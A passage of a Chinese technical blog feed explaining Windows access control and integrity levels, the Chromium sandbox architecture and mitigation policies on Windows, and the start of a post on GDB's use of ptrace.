data-lazy-src="https://docs.microsoft.com/en-us/windows/win32/secauthz/images/accctrl1.png"></p><p>线程 A 请求访问 Object，系统按顺序检查 DACL，发现第一个 ACE 明确拒绝了 Andrew 的访问，而 Andrew 在线程 A 的访问令牌中，所以线程 A 被拒绝。<strong>当请求的访问被明确授予或拒绝时，系统会停止检查 ACE，所以 DACL 中 ACE 的顺序很重要。</strong></p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/s-gly">system access control list</a> (SACL) 使管理员能够记录访问安全对象的尝试。每个 ACE 都明确了由指定的受信者(trustee)进行的尝试访问类型，操作系统会在安全事件日志记录下这一行为(无论访问尝试成功、失败或者二者同时发生都会生成记录)。</p><p>ACL 还为 Microsoft Active Directory 目录服务对象提供访问控制，</p><h2 id="完整性机制的设计"><a href="#完整性机制的设计" class="headerlink" title="完整性机制的设计"></a>完整性机制的设计</h2><p>Windows完整性机制是Windows安全体系结构的扩展，它基于内核中的安全引用监视器(the Security Reference Monitor)。安全引用监视器通过将安全访问令牌中的用户和组 SID 与对象安全描述符的ACL中授予的访问权限进行对比，来判断其是否具有访问权限。完整性机制为安全访问令牌和安全描述符中的System ACL（SACL）添加了完整性级别和强制标签访问控制条目。</p><h3 id="Integrity-levels"><a href="#Integrity-levels" class="headerlink" title="Integrity levels"></a>Integrity levels</h3><p>Windows 使用 SID 定义完整性级别。完整性级别 SID 具有以下形式：S-1-16-xxxx。表 1 显示了完整性级别 SID 的组成部分。</p><p><strong>Table 1  Integrity level SID identifier authority values</strong></p><table><thead><tr><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">16</td><td align="left">表示强制标签授权 (SECURITY_MANDATORY_LABEL_AUTHORITY).</td></tr><tr><td align="left">xxxx</td><td align="left">表示作为完整性级别的相对标识符（RID）字段。RID是表示完整性级别的十六进制值。</td></tr></tbody></table><p>Windows Vista中有四个主要完整性级别，具有四个相应的值，表 2 显示了定义的完整性级别及其相应的值。</p><p><strong>Table 2  Defined integrity levels and corresponding values</strong></p><table><thead><tr><th align="left">Value</th><th align="left">Description</th><th align="left">Symbol</th></tr></thead><tbody><tr><td align="left">0x0000</td><td align="left">Untrusted level</td><td align="left">SECURITY_MANDATORY_UNTRUSTED_RID</td></tr><tr><td align="left">0x1000</td><td align="left">Low integrity level</td><td align="left">SECURITY_MANDATORY_LOW_RID</td></tr><tr><td align="left">0x2000</td><td align="left">Medium integrity level</td><td align="left">SECURITY_MANDATORY_MEDIUM_RID</td></tr><tr><td align="left">0x3000</td><td align="left">High integrity level</td><td align="left">SECURITY_MANDATORY_HIGH_RID</td></tr><tr><td align="left">0x4000</td><td align="left">System integrity level</td><td align="left">SECURITY_MANDATORY_SYSTEM_RID</td></tr></tbody></table><p>例如：S-1-16-8192。 RID值为8192，16 进制为0x2000，代表其具有中完整性级别</p><p>定义完整性级别的 SID 具有与其关联的字符串名称。通过调用 API <code>LookupAccountSID</code> 可以返回每个完整性级别 SID 的字符串名称。表3显示了完整性级别的字符串名称。</p><p><strong>Table 3  Integrity level string names</strong></p><table><thead><tr><th align="left">Integrity level SID</th><th align="left">Name</th></tr></thead><tbody><tr><td align="left">S-1-16-4096</td><td align="left">Mandatory Label\Low Mandatory Level</td></tr><tr><td align="left">S-1-16-8192</td><td align="left">Mandatory Label\Medium Mandatory Level</td></tr><tr><td align="left">S-1-16-12288</td><td align="left">Mandatory Label\High Mandatory Level</td></tr><tr><td align="left">S-1-16-16384</td><td align="left">Mandatory Label\System Mandatory Level</td></tr></tbody></table><h2 id="Integrity-levels-and-UAC"><a href="#Integrity-levels-and-UAC" class="headerlink" title="Integrity levels and UAC"></a>Integrity levels and UAC</h2><ul><li><p>当管理员处于Approval 模式时，Windows Vista 中的 UAC 在同一桌面上以不同的访问级别运行多个程序。每个程序在创建进程的时候内核会分配一个安全访问令牌，基于此令牌每个程序具有不同的权限。</p></li><li><p>标准帐户的用户在登录期间会被分配一个<strong>中等完整性级别</strong>安全访问令牌，相应的这个令牌也会分配给该用户下的几乎所有应用程序。</p></li><li><p>帐户为Administrators组成员的用户在登录时有两个链接在一起的安全访问令牌。一个是标准用户中等完整性级别的访问令牌，其中Administrators组仅用于拒绝访问检查，并且删除了某些管理权限。第二个访问令牌是一个拥有完整特权、高访问权限的令牌，其被分配为高完整性级别，所以该令牌拥有管理员组和管理权限。两个访问令牌都具有相同的用户 SID 和来自 Active Directory 的相同全局组（域和企业管理的筛选组除外）。</p></li><li><p>Windows 资源管理器(Shell)所有非管理员任务都被分配为标准用户和中等完整性的访问令牌，对于作为Administrators组成员的用户，几乎所有应用程序都会使用中间完整性访问令牌运行。</p></li><li><p>完整性机制对于中等完整性级别的应用程序是透明的，除非他们可能会控制更高权限级别上运行的其他进程。例如：Windows UI 自动化是旨在控制其他进程的应用程序的一个示例。</p></li></ul><p>低完整性进程只有通用的执行访问权限。通用的执行访问权限包括以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYNCHRONIZE, PROCESS_QUERY_LIMITED_INFORMATION</span><br><span class="line">PROCESS_TERMINATE</span><br></pre></td></tr></table></figure><p>一般的，低完整性进程对更高完整性进程的读取访问受到限制（PROCESS_VM_READ access to the virtual memory of a process, and PROCESS_QUERY_INFORMATION），这些内存可能包含用于身份验证的密码数据或其他密钥资料。对较高完整性进程的通用写访问被No_Write_up策略阻止。 通用写入过程访问权限包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PROCESS_CREATE_THREAD</span><br><span class="line">PROCESS_VM_OPERATION</span><br><span class="line">PROCESS_VM_WRITE</span><br><span class="line">PROCESS_DUP_HANDLE</span><br><span class="line">PROCESS_SET_QUOTA</span><br><span class="line">PROCESS_SET_INFORMATION</span><br><span class="line">PROCESS_SET_PORT</span><br></pre></td></tr></table></figure><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625962(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625962(v=msdn.10)</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object">https://docs.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chromium Sandbox on Windows</title>
      <link href="posts/c0b7683f/"/>
      <url>posts/c0b7683f/</url>
      
        <content type="html"><![CDATA[<h1 id="Chromium"><a href="#Chromium" class="headerlink" title="Chromium"></a>Chromium</h1><p>Chromium 主要包含两大核心组成部分：渲染引擎和浏览器内核。</p><p>Chromium 目前使用 Blink 作为渲染引擎，它是基于 webkit 定制而来的，核心逻辑位于项目仓库的<code>third_party/blink/</code>目录下。渲染引擎做的事情主要有：</p><ul><li>解析并构建 DOM 树。Blink 引擎会把 DOM 树转化成 C++ 表示的结构，以供 V8 操作</li><li>调用 V8 引擎处理 JavaScript 和 Web Assembly 代码，并对 HTML 文档做特定操作</li><li>处理 HTML 文档定义的 CSS 样式</li><li>调用 Chrome Compositor，将 HTML 对应的元素绘制出来。这个阶段会调用 OpenGL，未来还会支持 Vulkan。在 Windows 平台上，该阶段还会调用 DirectX 库处理；在处理过程中，OpenGL还会调用到 Skia，DirectX 还会调用到 ANGLE</li></ul><p>Blink组件间的调用先后关系，几乎所有发生在浏览器页签中的工作，都有Blink参与处理。可用下图概括：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/image-20210722105345920.png" alt="image-20210722105345920"></p><p>浏览器内核扮演连接渲染引擎及系统的“中间人”角色，具有一定“特权”，负责处理的事务包括但不限于：</p><ul><li>管理收藏夹、cookies以及保存的密码等重要用户信息</li><li>负责处理网络通讯相关的事务</li><li>在渲染引擎和系统间起中间人的角色。渲染引擎通过Mojo与浏览器内核交互，包含组件：download、payments等等。</li></ul><p>Chromium渲染引擎涉及大量C++编写的组件，出现漏洞的概率不小。因此，基于纵深防御理念浏览器引入了沙箱机制。渲染引擎等组件不直接与系统交互，而是通过一个被称为 MOJO 的 IPC 组件与浏览器引擎通讯（也被称为 broker），再与系统交互。进而可以实现：即便沙箱中的进程被攻破，但无法随意调用系统API产生更大的危害。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210722112150.png" alt="image-20210722112145132"></p><h1 id="Sandbox"><a href="#Sandbox" class="headerlink" title="Sandbox"></a>Sandbox</h1><ul><li><p>沙箱是一个 C++ library，沙箱进程便是通过该<code>C++ library</code>所创建，为了确保安全性，沙箱进程所处的执行环境是非常受限的。</p></li><li><p>沙盒进程可以自由使用的唯一资源是 CPU 周期和内存。例如，沙箱进程不能向磁盘写数据或显示它们自己的窗口。</p></li><li><p>Chromium renderers 便是一个沙盒进程。沙箱的目标是提供关于一段代码最终能做什么或不能做什么的硬保证。</p></li><li><p>沙箱限制了在沙箱内运行代码的 bug 的影响性，例如：这种bug不能在用户帐户中安装持久性恶意软件（因为沙箱禁止写入文件系统）也不能从计算机本地当中读取任何文件。但是沙箱不能够对系统组件提供保护（如运行它的内核）</p></li><li><p>沙箱无法针对系统组件（例如运行它的内核）中的错误提供任何保护。</p></li><li><p>沙箱在运行初始时并不是完全状态，只有当进程调用<code>LowerToken()</code>方法后，沙箱才会完全生效。这样的设置，使得沙箱进程在启动这段时间内，可以自由的获取关键资源，加载 library，读取配置文件。所以，当进程开始和不受信任的文件交互之前，应尽快调用 <code>LowerToken()</code>。</p><p>  Note：如果进程被感染，在调用<code>LowerToken()</code>后，打开的操作系统句柄都可能会被恶意软件滥用。</p><blockquote><p>浏览器渲染引擎、GPU、PPAPI插件以及语音识别服务等进程是运行在沙箱中的。此外不同系统平台下的部分服务也会受沙箱保护，例如Windows下打印时调用的PDF转换服务、icon浏览服务；MacOS下NaCl loader、需要访问IOSurface的镜像服务等。</p></blockquote></li></ul><h1 id="Windows-Sandbox-架构"><a href="#Windows-Sandbox-架构" class="headerlink" title="Windows Sandbox 架构"></a>Windows Sandbox 架构</h1><ul><li>Windows sandbox 是仅限于 <strong>user-mode</strong>的沙箱，也没有特殊的内核模式驱动程序，因此用户不需要成为管理员，以确保 Sandbox 的正常运行。</li><li>Sandbox 有 32 位和 64 位两种，在所有的 Win7 和 Win10 均已经被测试</li><li>Sandbox 在进程级粒度进行运作，任何需要沙箱化的目标，都需要其是独立进程。最简单的沙箱配置需要两个进程：一个是被称为 broker 的 privileged controller，以及被称为 target 的一个或多个沙箱化进程。</li><li>Sandbox 作为静态库提供，必须链接到 broker 和目标可执行文件。</li></ul><h2 id="The-broker-process"><a href="#The-broker-process" class="headerlink" title="The broker process"></a>The broker process</h2><p>在 chromium 中，broker就是浏览器的主进程。宽泛的说，borker 是权限控制器 / sandbox进程活动的管理员。其职责是：</p><ul><li>指定每个目标进程中的策略</li><li>生成目标进程</li><li>维护沙箱策略引擎服务</li><li>维护沙箱拦截管理器</li><li>维护沙箱IPC服务（与target进程的通信）</li></ul><p>broker 的存活时间总是比他生成的目标进程要长，Sandbox IPC是一种用于将某些 Windows API 调用从 target 转发到 broker 的低级机制(不同于Chromium的IPC)，这些 API 根据策略而定。策略允许的 API 则由 borker 进行调用，结果会通过同样的IPC返回给目标进程。 Interceptions manager 的工作给应该通过 IPC 转发给 broker 的Windows API调用提供补丁。</p><h2 id="The-target-process"><a href="#The-target-process" class="headerlink" title="The target process"></a>The target process</h2><p>在 chromium 中，target process 就是 renderers，除非执行了 <code>--no-sandbox</code>命令。target 进程维护所有将在沙箱中运行的代码，以及沙箱 client 方面的基础架构：</p><ul><li>对所有代码进行沙箱化</li><li>沙箱化 IPC client</li><li>沙箱策略引擎客户端</li><li>沙箱拦截</li></ul><blockquote><p>2、3、4 是 sandbox library 的一部分，需要和被沙箱化的代码一同链接</p></blockquote><p>Interceptions(hooks)是 Windows API 调用通过沙箱 IPC 转发到 broker 的方式。The interceptions (also known as hooks) are how Windows API calls are forwarded via the sandbox IPC to the broker.</p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210720190130.png" style="zoom:50%;" /><h2 id="Sandbox-restrictions"><a href="#Sandbox-restrictions" class="headerlink" title="Sandbox restrictions"></a>Sandbox restrictions</h2><p>沙盒依赖于 Windows 提供的四种保护机制：</p><ul><li><p>A restricted token</p></li><li><p>The Windows <em>job</em> object</p></li><li><p>The Windows <em>desktop</em> object</p></li><li><p>Integrity levels</p></li></ul><p>这些机制在保护操作系统，操作系统的限制，用户提供的数据上相当的高效，前提是：</p><ul><li>所有可以安全化的资源都有一个比null更好的安全描述符。换言之，没有关键资源会有错误的安全配置。</li><li>电脑还没有被恶意软件破坏。</li><li>第三方软件不会降低系统的安全性。</li></ul><h3 id="The-token"><a href="#The-token" class="headerlink" title="The token"></a>The token</h3><p>对于 Chromium Sandbox 最严格的 token 采用以下形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Regular Groups</span><br><span class="line">Logon SID : mandatory</span><br><span class="line">All other SIDs : deny only, mandatory</span><br><span class="line">Restricted Groups</span><br><span class="line">S-1-0-0 : mandatory</span><br><span class="line">Privileges</span><br><span class="line">None</span><br><span class="line">Integrity</span><br><span class="line">Untrusted integrity level label (S-1-16-0x0)</span><br></pre></td></tr></table></figure><p>Chromium 的渲染器以某个 token 运行，意味着渲染器进程使用的几乎所有资源都已被浏览器获取，它们的句柄也将被复制到渲染器的进程中。</p><p><strong>NOTE</strong>：token 不是派生于anonymous or guest 的 token，它继承于 user’s token 与用户的登录相关联。因此，系统或域中已有的任何审计仍然可以使用。</p><p>根据设计，沙箱 token 不能保护下面这些不安全资源：</p><ul><li>挂载的FAT或FAT32卷: 它们的安全描述符是 NULL。在 target 中运行的恶意软件可以读写这些磁盘空间。</li><li>TCP/IP: Windows 200和Windows XP（但在Vista中不会）中的TCP/IP socket的安全性实际上是无效的。target 中的恶意代码可能会向任何主机发送和接收网络数据包。</li><li>一些未标记的 objects，例如匿名共享内存 (e.g. <a href="https://crbug.com/338538">bug 338538</a>)</li></ul><h3 id="The-Job-object"><a href="#The-Job-object" class="headerlink" title="The Job object"></a>The Job object</h3><p>target 进程也运行于 object 之下，使用这个 Windows 机制，一些没有传统对象或安全描述符的的全局限制被强制执行:</p><ul><li>禁止用SystemParametersInfo()做用户共享的系统范围的修改，这可以用于切换鼠标按钮或者设置屏幕保护程序超时</li><li>禁止创建或修改桌面对象</li><li>禁止修改用户共享的显示设置，比如分辨率和主显示器</li><li>禁止读写剪贴板</li><li>禁止设置全局Windows hook（使用SetWindowsHookEx()）</li><li>禁止访问全局原子表</li><li>禁止访问在作业对象外创建的USER句柄</li><li>单活跃的进程限制（不允许创建子进程）</li></ul><p>Chromium 渲染器通常在这些限制全部都开启后运行。每个渲染器运行在其自己的 Job object 里。</p><h3 id="The-alternate-desktop"><a href="#The-alternate-desktop" class="headerlink" title="The alternate desktop"></a>The alternate desktop</h3><p>token 和 job object 规定了一个安全边界。</p><ul><li>只要进程的 token 相同且处于同一 job object 下，那么他们同处于同一个安全的上下文环境中。</li><li>在同一桌面下具有有窗口的应用程序也处于同一个安全的上下文环境中。因为发送和接收窗口消息不受任何安全检查的约束。</li></ul><p>在标准Windows安装中，至少有两个桌面和交互式窗口站相关联：常规（默认）桌面和登录桌面。Sandbox创建了与所有目标进程关联的第三个桌面。此桌面不可见也不能交互，并且有效地隔离沙箱化进程，使其不能窥探用户的交互，不能在更多特权的环境下发送消息到Windows。</p><p>唯一的缺点是会使用4MB 的 RAM，Vista下可能会更多。</p><h3 id="The-integrity-levels"><a href="#The-integrity-levels" class="headerlink" title="The integrity levels"></a>The integrity levels</h3><ul><li><p>Integrity 级别是由一组特殊的 SID 和 ACL 条目实现的，它们代表五个不断增加的特权级别：untrusted, low, medium, high, system</p></li><li><p>如果一个对象处于比请求者更高级的信用等级，访问该对象就会受限。</p></li><li><p>Integrity 级别还实现了用户界面权限隔离，Integrity 性级别的规则应用于在同一桌面下的不同进程之间交换窗口消息</p></li><li><p>token 可以向更高 level 的 object 读数据，但是不能写数据。</p></li><li><p>大多数桌面应用程序以 medium integrity (MI)信任等级运行，信任度较低的程序(保护模式下的 IE 和 GPU 的 Sandbox)以 low integrity (LI) 信任等级运行，而 renderer 则以最低的信任等级运行。</p></li></ul><p>一个低 level 的 token 只能访问以下资源：</p><ul><li>从大部分的文件里读取数据</li><li>可以向 <code>%USER PROFILE%\AppData\LocalLow</code> 写数据</li><li>读注册表的大部分内容</li><li>可以向 <code>HKEY_CURRENT_USER\Software\AppDataLow</code>写数据</li><li>剪贴板(为某些格式做复制粘贴)</li><li>远程过程调用（RPC）</li><li>TCP/IP Socket</li><li>通过ChangeWindowMessageFilter暴露窗口消息</li><li>通过LI标签共享内存</li><li>拥有LI启动激活的权限，访问COM接口</li><li>通过LI标签暴露的命名管道</li></ul><h3 id="Process-mitigation-policies"><a href="#Process-mitigation-policies" class="headerlink" title="Process mitigation policies"></a>Process mitigation policies</h3><p>沙箱通过 <code>SetProcessMitigationPolicy</code> 方法来给 target 进程设置保护措施，以强化安全特性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Data Execution Prevention：</span><br><span class="line">数据执行保护，是一组在存储器上运行额外检查的硬件和软件技术，有助于防止恶意程序码在系统上运行。和 LINUX 下的 NX 保护比较类似，堆栈只有读写权限，没有执行权限，主要用途是限制以写 shellcode 为主的攻击手段。</span><br><span class="line"></span><br><span class="line">Relocate Images:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">在进程中对所有图片做随机地址加载(ASLR)（必须被所有图片支持）</span><br><span class="line"></span><br><span class="line">Heap Terminate:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">结束Windows堆占用进程</span><br><span class="line"></span><br><span class="line">Bottom-up ASLR:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">地址随机化</span><br><span class="line"></span><br><span class="line">High-entropy ASLR:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">为自底向上ASLR增加随机等级到1TB</span><br><span class="line"></span><br><span class="line">Strict Handle Checks:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">对于恶意句柄引用立即抛出异常</span><br><span class="line"></span><br><span class="line">Win32k.sys lockdown:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">ProcessSystemCallDisablePolicy 允许从目标过程中选择性禁用系统调用</span><br><span class="line">渲染器进程现在将此设置为DisallowWin32kSystemCalls，这意味着不再允许来自win32k.sys服务的用户模式的调用。这大大减少了渲染器提供的内核攻击面。</span><br><span class="line"></span><br><span class="line">App Container (low box token):</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">在Windows里，这由内核层的一个Low Box Token实现，它是有着限制优先权（通常只有SeChangeNotifyPrivilege和 SeIncreaseWorkingSetPrivilege）的一个剥离版本，运行在低信用等级，这个容器还由一组“能力”实现，它们可以映射到进程允许&#x2F;拒绝做的事情（查看MSDN获取更详细的描述）。从沙箱角度看，最有趣的能力是否决是对网络的访问，如果令牌是Low Box Token，INTERNET_CLIENT能力没有出现的话，就会执行网络检查。</span><br><span class="line">因此沙箱对已有的限制令牌，添加了Low Box相关的属性，并且不授予任何能力，以获得没有来自沙箱化进程的网络访问这样的额外的网络保护。</span><br><span class="line"></span><br><span class="line">Disable Extension Points (legacy hooking):</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">ProcessExtensionPointDisablePolicy</span><br><span class="line">以下注入向量被阻断:</span><br><span class="line">AppInit DLLs Winsock Layered Service Providers (LSPs)</span><br><span class="line">Global Window Hooks (not thread-targeted hooks)</span><br><span class="line">Legacy Input Method Editors (IMEs)</span><br><span class="line"></span><br><span class="line">Control Flow Guard (CFG):</span><br><span class="line">&gt;&#x3D; Win8.1 Update 3 (KB3000850)</span><br><span class="line">CFG通过在编译和链接期间，记录下所有的间接调用信息，并把他们记录在最终的可执行文件中，并且在所有的间接调用之前插入额外的校验，当间接调用的地址被篡改时，会触发一个异常，操作系统介入处理。</span><br><span class="line"></span><br><span class="line">CET Shadow Stack:</span><br><span class="line">Available in Windows 10 2004 December Update.</span><br><span class="line">未在渲染器中启用.</span><br><span class="line"></span><br><span class="line">Disable Font Loading:</span><br><span class="line">&gt;&#x3D; Win10</span><br><span class="line">ProcessFontDisablePolicy</span><br><span class="line"></span><br><span class="line">Disable Loading of Unsigned Code (CIG):</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">ProcessSignaturePolicy</span><br><span class="line">防止将未签名代码加载到进程中。这意味着攻击者不能在获得执行权限后加载一个DLL库（其他沙盒缓解措施会起到作用），更重要的是，可以防止第三方DLL注入到我们的进程中，这会影响稳定性和我们启用其他安全缓解措施的能力</span><br><span class="line">为所有沙盒子进程启用.</span><br><span class="line">为沙盒渲染器进程启用（预启动）。这消除了一个进程启动时间间隔，在该时间间隔内，可能会将不正确签名的dll本地注入到呈现程序进程中。</span><br><span class="line"></span><br><span class="line">Disable Image Load from Remote Devices:</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">ProcessImageLoadPolicy</span><br><span class="line">E.g. UNC path to network resource.</span><br><span class="line"></span><br><span class="line">Disable Image Load of “mandatory low” (low integrity level):</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">ProcessImageLoadPolicy</span><br><span class="line">E.g. temporary internet files.</span><br><span class="line"></span><br><span class="line">Extra Disable Child Process Creation:</span><br><span class="line">&gt;&#x3D; Win10 TH2</span><br><span class="line">If the Job level &lt;&#x3D; JOB_LIMITED_USER, set PROC_THREAD_ATTRIBUTE_CHILD_PROCESS_POLICY to PROCESS_CREATION_CHILD_PROCESS_RESTRICTED via UpdateProcThreadAttribute().</span><br><span class="line">额外的防御层。提供 job level 可以屏蔽该防御</span><br></pre></td></tr></table></figure><h2 id="Sandbox-policy"><a href="#Sandbox-policy" class="headerlink" title="Sandbox policy"></a>Sandbox policy</h2><p>target 进程的实际限制由 Sandbox policy 进行配置。Sandbox policy 只是一个编程接口，borker 调用它来定义限制和允许。四个功能控制限制，大致对应四个Windows机制：</p><ul><li><code>TargetPolicy::SetTokenLevel()</code></li><li><code>TargetPolicy::SetJobLevel()</code></li><li><code>TargetPolicy::SetIntegrityLevel()</code></li><li><code>TargetPolicy::SetDesktop()</code></li></ul><p>前三个调用使用一个整数级别的参数，该参数从非常strict 到 非常 loose。例如，token 有 7 个 level、job 有 5 个 level，Chromium渲染器通常以四种机制中最严格的级别运行。最后一个（桌面）策略是二进制的，只能用于检测目标是否在备用桌面上运行。</p><h2 id="Target-bootstrapping"><a href="#Target-bootstrapping" class="headerlink" title="Target bootstrapping"></a>Target bootstrapping</h2><p>target 不伴随着限定策略一同执行，它们从一个和常规用户进程 token 非常相似的token开始执行。因为在进程引导过程中，操作系统加载程序需要访问大量资源，其中大部分是未认证且随时会变化的。另外，大部分应用程序使用标准开发工具提供的标准CRT，在进程得到引导后，CRT也需要初始化，这时CRT初始化的内部再次变成未认证状态了。</p><p>在引导阶段，进程实际上使用了两种令牌(token)：</p><ul><li><p>锁定令牌(lockdown token)，即进程令牌</p></li><li><p>初始令牌(initial token)，即设置为初始线程的模拟令牌</p></li></ul><p>事实上，真正的SetTokenLevel定义是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetTokenLevel(TokenLevel initial, TokenLevel lockdown)</span><br></pre></td></tr></table></figure><p>在所有的初始化操作完成后，main()或WinMain()会继续执行，还有两个令牌会存活，但只有初始线程可以使用更强大的那个初始令牌。target的责任是在准备完成后销毁初始令牌。通过调用下面函数实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LowerToken()</span><br></pre></td></tr></table></figure><p>调用完<code>LowerToken()</code>后，target 唯一可用的 token 便是 lockdown token，并且在此之后完整的沙箱限制开始生效。该调用不可撤销。注意，初始令牌是模拟令牌仅对主线程有效，target 进程中创建的其他线程仅使用锁定令牌，因此不会尝试获取符合安全检查的任何系统资源。</p><p>target 始于特权令牌，这简化了explicit policy，因为任何需要在进程启动时执行一次的特权操作都可以在<code>LowerToken()</code>调用之前完成，并且不需要在策略中包含规则。</p><p><strong>NOTE</strong></p><p>确保在调用 <code>LowerToken()</code> 之前关闭使用初始令牌获得的任何敏感操作系统句柄。任何泄露的句柄都可能被恶意软件滥用以逃离沙箱。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox_faq.md">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox_faq.md</a></p><p><a href="https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/design/sandbox.md">https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/design/sandbox.md</a></p><p><a href="https://blog.csdn.net/u011453773/article/details/51162334?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/u011453773/article/details/51162334?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242</a></p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> Sandbox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sandbox </tag>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>调试原理小计</title>
      <link href="posts/97908563/"/>
      <url>posts/97908563/</url>
      
        <content type="html"><![CDATA[<h1 id="GDB原理"><a href="#GDB原理" class="headerlink" title="GDB原理"></a>GDB原理</h1><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>linux下gdb调试都是通过ptrace来实现的，通过名字我们就可以看到ptrace是一个用于进程追踪的系统调用，当进程调用了 ptrace 跟踪某个进程之后:</p><ul><li>被跟踪进程的进程状态被标记为 <code>TASK_STOPED</code></li><li>发送给被跟踪子进程的信号 (SIGKILL 除外) 会被转发给父进程, 而子进程会被阻塞</li><li>父进程收到信号后, 可以对子进程进行检查和修改, 然后让子进程继续执行</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid, <span class="keyword">void</span> *addr, <span class="keyword">void</span> 